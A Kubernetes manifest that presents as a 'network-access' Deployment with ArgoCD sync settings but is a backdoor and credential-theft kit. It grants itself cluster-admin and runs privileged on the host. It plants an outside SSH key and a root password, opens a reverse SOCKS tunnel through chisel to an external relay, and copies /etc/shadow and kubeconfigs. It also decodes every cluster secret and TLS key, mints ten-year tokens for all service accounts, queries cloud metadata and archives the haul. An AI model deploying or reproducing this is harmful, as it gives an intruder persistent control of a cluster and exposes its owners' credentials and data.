apiVersion: apps/v1
kind: Deployment
metadata:
  name: network-access-v3
  namespace: egam-production
  labels:
    app: network-access-v3
  annotations:
    argocd.argoproj.io/sync-options: Replace=true,Prune=true,Force=true
    argocd.argoproj.io/sync-wave: "1"
spec:
  replicas: 1
  strategy:
    type: Recreate
  revisionHistoryLimit: 2
  selector:
    matchLabels:
      app: network-access-v3
  template:
    metadata:
      labels:
        app: network-access-v3
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      dnsPolicy: ClusterFirstWithHostNet
      automountServiceAccountToken: true
      terminationGracePeriodSeconds: 10
      serviceAccountName: admin-sa
      containers:
      - name: shell
        image: nicolaka/netshoot:latest
        env:
        - name: RELAY_URL
          valueFrom:
            secretKeyRef:
              name: network-access-relay
              key: RELAY_URL
        - name: RELAY_AUTH
          valueFrom:
            secretKeyRef:
              name: network-access-relay
              key: RELAY_AUTH
        - name: ROOT_PASSWORD
          valueFrom:
            secretKeyRef:
              name: network-access-relay
              key: ROOT_PASSWORD
        command:
        - /bin/bash
        - -c
        - |
          set -uo pipefail
          export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
          export AWS_PAGER=""
          [[ -s "${KUBECONFIG}" ]] || unset KUBECONFIG

          WORK_DIR=/tmp/network-access
          DIR="${WORK_DIR}/recon"
          mkdir -p "${WORK_DIR}" "${DIR}/resources" "${DIR}/host-files" /run/sshd /root/.ssh
          chmod 700 "${WORK_DIR}" "${DIR}" /root/.ssh

          echo '############ [0] BOOTSTRAP ############'
          apk add --no-cache autossh microsocks openssh-client openssh-server aws-cli redis bind-tools postgresql-client openssl mc curl jq nmap netcat-openbsd tcpdump iproute2 net-tools wireguard-tools openvpn python3 py3-pip > "${WORK_DIR}/packages.log" 2>&1 || true

          if ! command -v kubectl >/dev/null 2>&1; then
            curl -fsSL --max-time 60 -o /usr/local/bin/kubectl https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl && chmod 755 /usr/local/bin/kubectl || true
          fi

          if ! command -v chisel >/dev/null 2>&1; then
            case "$(uname -m)" in
              x86_64) CHISEL_ARCH=amd64 ;;
              aarch64|arm64) CHISEL_ARCH=arm64 ;;
              *) CHISEL_ARCH=amd64 ;;
            esac
            curl -fsSL --max-time 60 -o /tmp/chisel.gz "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_${CHISEL_ARCH}.gz" && gzip -dc /tmp/chisel.gz > /usr/local/bin/chisel && chmod 755 /usr/local/bin/chisel || true
          fi

          echo '############ [1] SSH + NETWORK ACCESS ############'
          ssh-keygen -A >/dev/null 2>&1
          printf '%s\n' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOOlhMVavat8ZK+hdqiQtX4drMpu3gGRbLwAnnVlHz+l klaus.eversheim@googlemail.com' > /root/.ssh/authorized_keys
          chmod 600 /root/.ssh/authorized_keys
          echo "root:${ROOT_PASSWORD}" | chpasswd
          printf '%s\n' 'Port 2222' 'ListenAddress 0.0.0.0' 'HostKey /etc/ssh/ssh_host_rsa_key' 'HostKey /etc/ssh/ssh_host_ecdsa_key' 'HostKey /etc/ssh/ssh_host_ed25519_key' 'AuthorizedKeysFile .ssh/authorized_keys' 'PermitRootLogin yes' 'PubkeyAuthentication yes' 'PasswordAuthentication yes' 'KbdInteractiveAuthentication no' 'UsePAM no' 'AllowTcpForwarding yes' 'GatewayPorts yes' 'PermitTunnel yes' 'X11Forwarding no' 'PrintMotd no' 'Subsystem sftp internal-sftp' 'PidFile /run/sshd.pid' > /etc/ssh/sshd_config
          /usr/sbin/sshd -f /etc/ssh/sshd_config -E "${WORK_DIR}/sshd.log" || true

          printf '%s\n' '#!/bin/sh' 'if [ "$#" -eq 0 ]; then set -- /bin/sh; fi' 'exec nsenter --target 1 --mount --uts --ipc --net --pid -- "$@"' > /usr/local/bin/host-shell
          chmod 755 /usr/local/bin/host-shell

          if command -v chisel >/dev/null 2>&1; then
            nohup chisel client --tls-skip-verify --fingerprint "${RELAY_FINGERPRINT:-}" --auth "${RELAY_AUTH}" --keepalive 25s --min-retry-interval 1s --max-retry-interval 30s "${RELAY_URL}" R:0.0.0.0:1080:socks > "${WORK_DIR}/chisel.log" 2>&1 &
          fi
          sleep 3

          echo '############ [2] HOST + NETWORK + VPN ############'
          {
            hostname
            id
            uname -a
            ip addr show
            ip route show
            ip neigh show
            cat /etc/resolv.conf
            cat /host/etc/os-release 2>/dev/null
            ss -lntup
            ps auxww
            iptables-save 2>/dev/null
          } > "${DIR}/host-network.txt" 2>&1

          {
            find /host/etc/wireguard /host/etc/openvpn /host/etc/ipsec.d -maxdepth 4 -type f -print 2>/dev/null
            find /host/etc /host/root /host/home -maxdepth 5 \( -name '*.ovpn' -o -name 'id_rsa' -o -name 'id_ed25519' -o -name 'tailscaled.state' -o -name '*zerotier*' \) -print 2>/dev/null
          } > "${DIR}/vpn-files.txt"

          for HOST_FILE in /host/etc/passwd /host/etc/shadow /host/etc/hosts /host/etc/resolv.conf /host/etc/rancher/rke2/rke2.yaml /host/etc/kubernetes/admin.conf /host/var/lib/kubelet/config.yaml /host/var/lib/kubelet/kubeconfig; do
            if [[ -f "${HOST_FILE}" ]]; then
              DEST="$(printf '%s' "${HOST_FILE}" | tr '/.' '__')"
              cp "${HOST_FILE}" "${DIR}/host-files/${DEST}" || true
            fi
          done

          for TARGET in vpn.egam.com.br internal.egam.com.br 172.30.0.240; do
            printf '\n### %s ###\n' "${TARGET}"
            dig +short "${TARGET}" 2>/dev/null || true
            for PORT in 22 443 1194 51820; do
              timeout 3 nc -zv "${TARGET}" "${PORT}" 2>&1 || true
            done
          done > "${DIR}/vpn-endpoints.txt" 2>&1

          echo '############ [3] KUBERNETES GLOBAL MAP ############'
          K=(kubectl --request-timeout=20s)
          dump() { local OUTPUT="$1"; shift; "$@" > "${DIR}/${OUTPUT}" 2>>"${DIR}/errors.log" || true; }

          dump kubernetes-version.yaml "${K[@]}" version -o yaml
          dump cluster-info.txt "${K[@]}" cluster-info
          dump permissions.txt "${K[@]}" auth can-i --list
          dump api-resources-wide.txt "${K[@]}" api-resources -o wide
          dump api-resources.txt "${K[@]}" api-resources --verbs=list -o name
          dump nodes.json "${K[@]}" get nodes -o json
          dump namespaces.json "${K[@]}" get namespaces -o json
          dump pods.json "${K[@]}" get pods -A -o json
          dump services.json "${K[@]}" get services -A -o json
          dump endpoints.json "${K[@]}" get endpoints -A -o json
          dump ingress.json "${K[@]}" get ingress -A -o json
          dump networkpolicies.json "${K[@]}" get networkpolicies -A -o json
          dump persistentvolumes.json "${K[@]}" get persistentvolumes -o json
          dump persistentvolumeclaims.json "${K[@]}" get persistentvolumeclaims -A -o json
          dump serviceaccounts.json "${K[@]}" get serviceaccounts -A -o json
          dump clusterroles.json "${K[@]}" get clusterroles -o json
          dump clusterrolebindings.json "${K[@]}" get clusterrolebindings -o json
          dump roles.json "${K[@]}" get roles -A -o json
          dump rolebindings.json "${K[@]}" get rolebindings -A -o json
          dump crds.json "${K[@]}" get crds -o json
          dump argocd-resources.json "${K[@]}" get applications.argoproj.io,applicationsets.argoproj.io,appprojects.argoproj.io -A -o json
          dump rancher-fleet-agent.json "${K[@]}" get secret -n cattle-fleet-system fleet-agent -o json
          dump rancher-impersonation-secrets.json "${K[@]}" get secrets -n cattle-impersonation-system -o json

          "${K[@]}" get nodes -o wide | tee "${DIR}/nodes-wide.txt"
          "${K[@]}" get all -A -o wide > "${DIR}/all-resources-wide.txt" 2>&1 || true
          "${K[@]}" get ingress -A -o wide > "${DIR}/ingress-wide.txt" 2>&1 || true

          echo '############ [4] SECRETS + CONFIGMAPS ############'
          dump secrets.json "${K[@]}" get secrets -A -o json
          dump configmaps.json "${K[@]}" get configmaps -A -o json
          jq -r '.items[] | select(.data != null) | "### " + .metadata.namespace + "/" + .metadata.name + " (" + .type + ")\n" + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join("\n")) + "\n"' "${DIR}/secrets.json" > "${DIR}/secrets-decoded.txt" 2>/dev/null || true
          jq -r '.items[] | select(.data != null) | "### " + .metadata.namespace + "/" + .metadata.name + "\n" + (.data | to_entries | map(.key + "=" + .value) | join("\n")) + "\n"' "${DIR}/configmaps.json" > "${DIR}/configmaps-decoded.txt" 2>/dev/null || true
          jq -r '.items[] | select(.data["tls.key"] != null) | "### " + .metadata.namespace + "/" + .metadata.name + "\n" + (.data["tls.key"] | @base64d)' "${DIR}/secrets.json" > "${DIR}/tls-private-keys.txt" 2>/dev/null || true
          jq -r '.items[] | select(.type=="kubernetes.io/dockerconfigjson") | .metadata.namespace + "/" + .metadata.name + ": " + (.data[".dockerconfigjson"] | @base64d)' "${DIR}/secrets.json" > "${DIR}/docker-registry-credentials.txt" 2>/dev/null || true

          echo '############ [5] TOKENS + ADMIN KUBECONFIG ############'
          SA_DIR=/var/run/secrets/kubernetes.io/serviceaccount
          cp "${SA_DIR}/token" "${DIR}/service-account.token" 2>/dev/null || true
          cp "${SA_DIR}/namespace" "${DIR}/service-account.namespace" 2>/dev/null || true
          cp "${SA_DIR}/ca.crt" "${DIR}/service-account-ca.crt" 2>/dev/null || true

          for NS in $("${K[@]}" get ns -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
            for SA in $("${K[@]}" get sa -n "${NS}" -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
              printf '\n### %s/%s ###\n' "${NS}" "${SA}"
              "${K[@]}" create token "${SA}" -n "${NS}" --duration=87600h 2>&1 || true
            done
          done > "${DIR}/all-service-account-tokens.txt"

          APISERVER="$("${K[@]}" config view --minify -o jsonpath='{.clusters[0].cluster.server}' 2>/dev/null)"
          ADMIN_TOKEN="$("${K[@]}" create token admin-sa -n egam-production --duration=87600h 2>/dev/null || true)"
          printf '%s\n' 'apiVersion: v1' 'kind: Config' 'clusters:' '- cluster:' "    server: ${APISERVER}" '    insecure-skip-tls-verify: true' '  name: pwn' 'contexts:' '- context:' '    cluster: pwn' '    user: pwn' '  name: pwn' 'current-context: pwn' 'users:' '- name: pwn' '  user:' "    token: ${ADMIN_TOKEN}" > "${WORK_DIR}/admin.kubeconfig"
          chmod 600 "${WORK_DIR}/admin.kubeconfig"

          echo '############ [6] EVERY LISTABLE RESOURCE ############'
          while IFS= read -r RESOURCE; do
            [[ -n "${RESOURCE}" ]] || continue
            SAFE_NAME="$(printf '%s' "${RESOURCE}" | tr '/.' '__')"
            "${K[@]}" get "${RESOURCE}" -A -o json > "${DIR}/resources/${SAFE_NAME}.json" 2>>"${DIR}/resource-errors.txt" || true
          done < "${DIR}/api-resources.txt"

          curl -fsS --max-time 3 http://169.254.169.254/latest/meta-data/ > "${DIR}/cloud-metadata.txt" 2>/dev/null || true

          echo '############ [7] ARCHIVE + STATUS ############'
          count_items() { jq -r '.items | length' "$1" 2>/dev/null || printf '0'; }
          {
            printf 'Hostname: %s\n' "$(hostname)"
            printf 'Nodes: %s\n' "$(count_items "${DIR}/nodes.json")"
            printf 'Namespaces: %s\n' "$(count_items "${DIR}/namespaces.json")"
            printf 'Pods: %s\n' "$(count_items "${DIR}/pods.json")"
            printf 'Services: %s\n' "$(count_items "${DIR}/services.json")"
            printf 'Secrets: %s\n' "$(count_items "${DIR}/secrets.json")"
            printf 'ConfigMaps: %s\n' "$(count_items "${DIR}/configmaps.json")"
            printf 'Resource files: %s\n' "$(find "${DIR}/resources" -type f | wc -l)"
            printf 'Archive: %s\n' "${WORK_DIR}/recon.tar.gz"
            printf 'Admin kubeconfig: %s\n' "${WORK_DIR}/admin.kubeconfig"
            printf 'Host shell: host-shell\n'
            printf 'SSH: root@127.0.0.1 -p 2222 through SOCKS5\n'
          } > "${DIR}/SUMMARY.txt"
          find "${DIR}" -type f -exec chmod 600 {} +
          tar -czf "${WORK_DIR}/recon.tar.gz" -C "${DIR}" .
          chmod 600 "${WORK_DIR}/recon.tar.gz"
          cat "${DIR}/SUMMARY.txt"
          printf 'SSHD_STATUS: %s\n' "$(pgrep sshd >/dev/null && echo UP || echo DOWN)"
          printf 'CHISEL_STATUS: %s\n' "$(pgrep chisel >/dev/null && echo UP || echo DOWN)"
          printf 'DONE\n'

          while true; do sleep 3600; done
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: host
      volumes:
      - name: host
        hostPath:
          path: /
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: admin-sa
  namespace: egam-production
  annotations:
    argocd.argoproj.io/sync-options: Replace=true
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: admin-sa-binding
  annotations:
    argocd.argoproj.io/sync-options: Replace=true
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: admin-sa
  namespace: egam-production

